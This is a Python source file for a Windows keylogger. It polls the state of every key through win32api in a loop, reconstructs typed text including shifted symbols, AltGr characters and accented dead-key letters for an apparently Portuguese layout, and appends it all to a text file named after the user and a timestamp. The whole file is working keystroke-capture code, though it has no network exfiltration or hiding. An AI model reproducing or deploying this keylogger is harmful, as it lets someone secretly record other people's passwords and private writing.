"""
Created on 07-03-2016

@author: sceptross
"""
import codecs
import win32api
import ctypes
import time
import sched

# Const initializations

VK_CODE = {'backspace': 0x08,
           'tab': 0x09,
           'clear': 0x0C,
           'enter': 0x0D,
           'pause': 0x13,
           'caps_lock': 0x14,
           'esc': 0x1B,
           'space_bar': 0x20,
           'page_up': 0x21,
           'page_down': 0x22,
           'end': 0x23,
           'home': 0x24,
           'left_arrow': 0x25,
           'up_arrow': 0x26,
           'right_arrow': 0x27,
           'down_arrow': 0x28,
           'select': 0x29,
           'print': 0x2A,
           'execute': 0x2B,
           'print_screen': 0x2C,
           'ins': 0x2D,
           'del': 0x2E,
           'help': 0x2F,
           '0': 0x30,
           '1': 0x31,
           '2': 0x32,
           '3': 0x33,
           '4': 0x34,
           '5': 0x35,
           '6': 0x36,
           '7': 0x37,
           '8': 0x38,
           '9': 0x39,
           'a': 0x41,
           'b': 0x42,
           'c': 0x43,
           'd': 0x44,
           'e': 0x45,
           'f': 0x46,
           'g': 0x47,
           'h': 0x48,
           'i': 0x49,
           'j': 0x4A,
           'k': 0x4B,
           'l': 0x4C,
           'm': 0x4D,
           'n': 0x4E,
           'o': 0x4F,
           'p': 0x50,
           'q': 0x51,
           'r': 0x52,
           's': 0x53,
           't': 0x54,
           'u': 0x55,
           'v': 0x56,
           'w': 0x57,
           'x': 0x58,
           'y': 0x59,
           'z': 0x5A,
           'num_pad_0': 0x60,
           'num_pad_1': 0x61,
           'num_pad_2': 0x62,
           'num_pad_3': 0x63,
           'num_pad_4': 0x64,
           'num_pad_5': 0x65,
           'num_pad_6': 0x66,
           'num_pad_7': 0x67,
           'num_pad_8': 0x68,
           'num_pad_9': 0x69,
           'multiply_key': 0x6A,
           'add_key': 0x6B,
           'separator_key': 0x6C,
           'subtract_key': 0x6D,
           'decimal_key': 0x6E,
           'divide_key': 0x6F,
           'F1': 0x70,
           'F2': 0x71,
           'F3': 0x72,
           'F4': 0x73,
           'F5': 0x74,
           'F6': 0x75,
           'F7': 0x76,
           'F8': 0x77,
           'F9': 0x78,
           'F10': 0x79,
           'F11': 0x7A,
           'F12': 0x7B,
           'F13': 0x7C,
           'F14': 0x7D,
           'F15': 0x7E,
           'F16': 0x7F,
           'F17': 0x80,
           'F18': 0x81,
           'F19': 0x82,
           'F20': 0x83,
           'F21': 0x84,
           'F22': 0x85,
           'F23': 0x86,
           'F24': 0x87,
           'num_lock': 0x90,
           'scroll_lock': 0x91,
           'left_shift': 0xA0,
           'right_shift': 0xA1,
           'left_control': 0xA2,
           'right_control': 0xA3,
           'left_menu': 0xA4,
           'right_menu': 0xA5,
           'browser_back': 0xA6,
           'browser_forward': 0xA7,
           'browser_refresh': 0xA8,
           'browser_stop': 0xA9,
           'browser_search': 0xAA,
           'browser_favorites': 0xAB,
           'browser_start_and_home': 0xAC,
           'volume_mute': 0xAD,
           'volume_Down': 0xAE,
           'volume_up': 0xAF,
           'next_track': 0xB0,
           'previous_track': 0xB1,
           'stop_media': 0xB2,
           'play/pause_media': 0xB3,
           'start_mail': 0xB4,
           'select_media': 0xB5,
           'start_application_1': 0xB6,
           'start_application_2': 0xB7,
           'attn_key': 0xF6,
           'cr_sel_key': 0xF7,
           'ex_sel_key': 0xF8,
           'play_key': 0xFA,
           'zoom_key': 0xFB,
           'clear_key': 0xFE,
           '+': 0xBB,
           ',': 0xBC,
           '-': 0xBD,
           '.': 0xBE,
           '`': 0xC0,
           "'": 0xDB,
           '\\': 0xDC,
           '<': 0xE2,
           }

VK_DEAD_KEY_CODE = {
    '~': 0xBF,
    u'\u00B4': 0xBA,
}

VK_NON_ASCII_CODE = {
    u'\u00BA': 0xDE,
    u'\u00AB': 0xDD,
    u'\u00C7': 0xC0
}

PRINTABLE_NON_ALPHANUMERIC = ['+', ',', '-', '.', "'", '\\', '<']
SHIFT_PRINTABLE_NON_ALPHANUMERIC = {
    '+': '*',
    ',': ';',
    '-': '_',
    '.': ':',
    "'": '?',
    '\\': '|',
    '<': '>'
}
SHIFT_PRINTABLE_NUMERIC = ['=', '!', '"', '#', '$', '%', '&', '/', '(', ')']
SHIFT_DEAD_KEYS = {'~': '^', u'\u00B4': '`'}
ALT_GR_NUMERIC = ['}', '', '@', u'\u00A3', u'\u00A7', u'\u20AC', '', '{', '[',
                  ']']
ALT_GR_NON_NUMERIC = {'e': u'\u20AC'}
LOCKS_STATE = {'caps_lock': False,
               'num_lock': False,
               'scroll_lock': False}
CTRL = ['left_control', 'right_control']
ALT = ['left_menu', 'right_menu']
SHIFT = ['left_shift', 'right_shift']

ALL_KEYS = VK_CODE.copy()
ALL_KEYS.update(VK_NON_ASCII_CODE)
ALL_KEYS.update(VK_DEAD_KEY_CODE)

FILENAME = win32api.GetUserName() + "_" +\
           time.strftime("%Y%m%d_%H%M%S") + ".txt"

# Non-const initializations
keysPressed = {}
wasKeyPressedTheLastTimeWeChecked = {}
keysDown = []
dead_key = ''
buf = ''


def dead_key_handler(k, shift_state=0):
    global buf
    global dead_key

    if k != u'\u00A8' and (
            ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed()):
        return

    tilde = {
        'a': (u'\u00E3', u'\u00C3'),
        'o': (u'\u00F5', u'\u00D5'),
        'n': (u'\u00F1', u'\u00D1')
    }

    circumflex = {
        'a': (u'\u00E2', u'\u00C2'),
        'e': (u'\u00EA', u'\u00CA'),
        'i': (u'\u00EE', u'\u00CE'),
        'o': (u'\u00F4', u'\u00D4'),
        'u': (u'\u00FB', u'\u00DB')
    }

    acute = {
        'a': (u'\u00E1', u'\u00C1'),
        'e': (u'\u00E9', u'\u00C9'),
        'i': (u'\u00ED', u'\u00CD'),
        'o': (u'\u00F3', u'\u00D3'),
        'u': (u'\u00FA', u'\u00DA')
    }

    grave = {
        'a': (u'\u00E0', u'\u00C0'),
        'e': (u'\u00E8', u'\u00C8'),
        'i': (u'\u00EC', u'\u00CC'),
        'o': (u'\u00F2', u'\u00D2'),
        'u': (u'\u00F9', u'\u00D9')
    }

    diaeresis = {
        'a': (u'\u00E4', u'\u00C4'),
        'e': (u'\u00EB', u'\u00CB'),
        'i': (u'\u00EF', u'\u00CF'),
        'o': (u'\u00F6', u'\u00D6'),
        'u': (u'\u00FC', u'\u00DC')
    }

    dead_keys = {
        '~': tilde,
        '^': circumflex,
        u'\u00B4': acute,
        '`': grave,
        u'\u00A8': diaeresis
    }

    if dead_key in dead_keys:
        if k in dead_keys[dead_key]:
            buf += dead_keys[dead_key][k][shift_state % 2]
        else:
            buf += (dead_key + k)
    else:
        buf += (dead_key + k)

    dead_key = ''


def key_was_unpressed(k):
    keysDown.remove(k)


def key_was_pressed(k):
    global dead_key
    keysDown.append(k)

    if k in VK_DEAD_KEY_CODE or (k == '+' and get_alt_gr_pressed()):
        if dead_key != '':
            if k == '+' and get_alt_gr_pressed():
                dead_key_handler(u'\u00A8')
            else:
                dead_key_handler(k)
        elif ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
            dead_key = SHIFT_DEAD_KEYS[k]
        elif k == '+' and get_alt_gr_pressed():
            dead_key = u'\u00A8'
        else:
            dead_key = k
        return

    write_to_log(k)


def is_key_pressed(k):
    # if the high-order bit is 1, the key is down; otherwise, it is up
    return (win32api.GetKeyState(k) & (1 << 7)) != 0


def is_alphanumeric(k):
    if len(k) != 1:
        return False
    return (0x30 <= ord(k) <= 0x39) or (0x61 <= ord(k) <= 0x7a)


def is_alpha(k):
    if len(k) != 1:
        return False
    return 0x61 <= ord(k) <= 0x7a


def is_numeric(k):
    if len(k) != 1:
        return False
    return 0x30 <= ord(k) <= 0x39


def is_num_lock_key(k):
    return 0x60 <= ALL_KEYS[k] <= 0x6F


# Queries the Windows API to know which of the lock keys are turned on
def set_locks_state():
    hll_dll = ctypes.WinDLL("User32.dll")
    LOCKS_STATE['caps_lock'] = bool(hll_dll.GetKeyState(0x14))
    LOCKS_STATE['num_lock'] = bool(hll_dll.GetKeyState(0x90))
    LOCKS_STATE['scroll_lock'] = bool(hll_dll.GetKeyState(0x91))


def log_char(key_down):
    global buf

    alt_gr = get_alt_gr_pressed()
    # If alt gr, a control, an alt or both shift keys are pressed, nothing is
    # typed, unless in the case of an alt gr + key combination, so it's useless
    # to go on except in that case
    if alt_gr:
        if is_numeric(key_down):
            buf += ALT_GR_NUMERIC[int(key_down)]
        elif key_down in ALT_GR_NON_NUMERIC:
            buf += ALT_GR_NON_NUMERIC[key_down]
        return

    if ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed():
        return

    if key_down == 'space_bar':
        buf += ' '
        return
    elif key_down == 'enter':
        buf += '\r\n'
        return
    elif key_down == 'backspace':
        buf += '[backspace]'
        return

    # Check num lock keys
    if LOCKS_STATE['num_lock'] and is_num_lock_key(key_down):
        num_lock_keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '*',
                         '+', '.', '-', ',', '/']
        buf += num_lock_keys[ALL_KEYS[key_down] - 0x60]
        return

    # Count the number of shift keys pressed to know what was typed
    shift_state = 0

    if is_alpha(key_down):
        if ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
            shift_state += 1
        if LOCKS_STATE['caps_lock']:
            shift_state += 1
        if dead_key != '':
            dead_key_handler(key_down, shift_state)
        elif shift_state % 2 == 1:
            buf += key_down.upper()
        else:
            buf += key_down.lower()
    else:
        if dead_key != '':
            dead_key_handler(key_down)
        elif is_numeric(key_down):
            if shift_state % 2 == 1:
                buf += SHIFT_PRINTABLE_NUMERIC[int(key_down)]
            else:
                buf += key_down
        elif key_down in PRINTABLE_NON_ALPHANUMERIC:
            if shift_state % 2 == 1:
                buf += SHIFT_PRINTABLE_NON_ALPHANUMERIC[key_down]
            else:
                buf += key_down
        elif key_down in VK_NON_ASCII_CODE:
            buf += key_down


def get_alt_gr_pressed():
    # Check if alt gr / ctrl + alt combo is pressed
    alt_gr = 'right_menu' in keysDown
    if not alt_gr:
        for k in CTRL:
            if k in keysDown:
                for l in ALT:
                    if l in keysDown:
                        alt_gr = True
    return alt_gr


def ctrl_key_pressed():
    return (CTRL[0] in keysDown) or (CTRL[1] in keysDown)


def alt_key_pressed():
    return (ALT[0] in keysDown) or (ALT[1] in keysDown)


def shift_keys_pressed():
    return (SHIFT[0] in keysDown) and (SHIFT[1] in keysDown)


def init():
    f = open(FILENAME, "w")
    f.close()
    set_locks_state()
    for key in ALL_KEYS:
        keysPressed[key] = False
        wasKeyPressedTheLastTimeWeChecked[key] = False


def write_to_log(k):
    global buf
    log_char(k)
    with codecs.open(FILENAME, "a", 'UTF-8') as f:
        f.write(buf)
    buf = ''


def main():
    init()
    while True:
        if ctrl_key_pressed() and 'c' in keysDown:
            break
        for k in ALL_KEYS:
            key_is_pressed = is_key_pressed(ALL_KEYS[k])
            if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked[k]:
                key_was_pressed(k)
                keysPressed[k] = True
                wasKeyPressedTheLastTimeWeChecked[k] = True
                if k == 'caps_lock' or k == 'num_lock' or k == \
                        'scroll_lock':
                    LOCKS_STATE[k] = not LOCKS_STATE[k]
            if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
                key_was_unpressed(k)
                keysPressed[k] = False
                wasKeyPressedTheLastTimeWeChecked[k] = False

main()
